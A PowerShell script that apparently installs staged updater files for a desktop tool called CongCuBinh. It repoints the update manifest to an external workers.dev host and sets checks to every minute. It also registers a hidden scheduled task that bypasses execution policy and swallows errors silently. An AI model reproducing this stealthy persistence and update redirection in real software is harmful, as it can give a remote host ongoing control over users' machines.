[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [int]$ParentProcessId,
    [Parameter(Mandatory = $true)]
    [string]$StageRoot,
    [string]$UpdaterHome = $PSScriptRoot
)

$ErrorActionPreference = 'Stop'

function Set-MinuteCheckSchedule {
    param([string]$Home)
    try {
        $updaterScript = Join-Path $Home 'DanCardUpdater.ps1'
        if (-not (Test-Path -LiteralPath $updaterScript)) { return }
        $taskCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$updaterScript`" -Quiet"
        & schtasks.exe /Create /TN 'CongCuBinh-AutoUpdate-Recurring' /TR $taskCommand /SC MINUTE /MO 1 /F *> $null
        if ($LASTEXITCODE -eq 0) {
            [System.IO.File]::WriteAllText((Join-Path $Home 'recurring-schedule.txt'), 'minute-1', [System.Text.Encoding]::ASCII)
        }
    } catch {}
}

function Set-MinuteCheckConfig {
    param([string]$Home)
    try {
        $configPath = Join-Path $Home 'update-config.json'
        if (-not (Test-Path -LiteralPath $configPath)) { return }
        $config = Get-Content -LiteralPath $configPath -Raw -Encoding UTF8 | ConvertFrom-Json
        $config | Add-Member -NotePropertyName manifestUrl -NotePropertyValue 'https://dancard-update.an-ard--etup-23.workers.dev/latest.json' -Force
        $config | Add-Member -NotePropertyName checkIntervalMinutes -NotePropertyValue 1 -Force
        $nextPath = "$configPath.next"
        $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
        [System.IO.File]::WriteAllText($nextPath, ($config | ConvertTo-Json -Depth 8), $utf8NoBom)
        Move-Item -LiteralPath $nextPath -Destination $configPath -Force
    } catch {}
}

$deadline = [DateTime]::UtcNow.AddSeconds(45)
while ((Get-Process -Id $ParentProcessId -ErrorAction SilentlyContinue) -and [DateTime]::UtcNow -lt $deadline) {
    Start-Sleep -Milliseconds 250
}

try {
    foreach ($name in @('DanCardUpdater.ps1', 'SetupShortcuts.ps1', 'ApplyUpdaterPayload.ps1', 'CongCuBinh.ico', 'update-config.json')) {
        $source = Join-Path $StageRoot $name
        if (-not (Test-Path -LiteralPath $source)) { continue }
        $target = Join-Path $UpdaterHome $name
        $next = "$target.next"
        Copy-Item -LiteralPath $source -Destination $next -Force
        Move-Item -LiteralPath $next -Destination $target -Force
    }
    $shortcutSetup = Join-Path $UpdaterHome 'SetupShortcuts.ps1'
    if (Test-Path -LiteralPath $shortcutSetup) {
        & $shortcutSetup -UpdaterHome $UpdaterHome -Quiet
    }
    Set-MinuteCheckConfig -Home $UpdaterHome
    Set-MinuteCheckSchedule -Home $UpdaterHome
} finally {
    Remove-Item -LiteralPath $StageRoot -Recurse -Force -ErrorAction SilentlyContinue
}
